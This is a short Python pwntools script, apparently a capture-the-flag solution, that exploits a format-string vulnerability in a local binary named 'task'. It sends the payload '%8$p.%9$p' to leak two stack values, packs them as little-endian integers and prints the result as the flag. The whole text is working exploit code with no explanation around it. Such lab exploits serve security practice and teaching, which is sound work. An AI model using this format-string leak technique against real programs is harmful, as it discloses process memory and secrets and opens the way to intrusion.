#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

p = elf.process()
#p = elf.debug(gdbscript="")
#p = remote("127.0.0.1", 9001)

p.sendline(b"%8$p.%9$p")

leaks = p.read().decode().split(".")

flag = struct.pack("<Q", int(leaks[0], 16))
flag += struct.pack("<Q", int(leaks[1], 16))

print(flag[:-3].decode())
